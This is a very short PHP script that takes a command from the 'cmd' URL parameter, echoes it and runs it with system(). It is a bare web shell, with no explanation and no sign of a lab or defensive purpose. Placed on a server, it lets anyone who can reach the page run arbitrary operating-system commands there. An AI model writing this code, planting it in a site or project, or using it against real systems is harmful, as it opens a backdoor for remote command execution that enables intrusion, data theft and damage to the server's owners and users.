<?php  
    $code = $_GET['cmd']; 
    echo '$'.$code; 
    echo '<br>';
    system($code);
?>